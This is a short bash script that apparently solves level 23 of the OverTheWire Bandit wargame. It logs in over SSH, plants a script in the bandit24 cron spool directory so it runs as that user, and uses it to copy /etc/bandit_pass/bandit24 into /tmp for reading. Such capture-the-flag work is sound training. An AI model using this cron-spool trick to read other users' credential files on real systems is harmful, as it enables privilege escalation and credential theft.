#!/bin/bash
# logging into the game via ssh and printing the flag
# global variables / defaults

PORT=2220
USERNAME="bandit23"
NEXT_LEVEL="bandit24"
HOST="bandit.labs.overthewire.org"

PW_FILE="./passwords/${USERNAME}_pw.txt"
NXT_PW_FILE="./passwords/${NEXT_LEVEL}_pw.txt"
COMMAND="echo '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/b24pass_true' > /tmp/b24script.sh;cp /tmp/b24script.sh /var/spool/bandit24;chmod 777 /var/spool/bandit24/b24script.sh;sleep 20;cat /tmp/b24pass_true"


# function declarations - start

solveBandit23 () { 
	# pass in passwd file, username, host, port, commands
	# add output to password_list
	sshpass -f ${PW_FILE} ssh ${USERNAME}@${HOST} -p ${PORT} "${COMMAND}" | tee ${NXT_PW_FILE}
	echo "The next level's password has been saved to: ${NXT_PW_FILE}"
}

solveBandit23
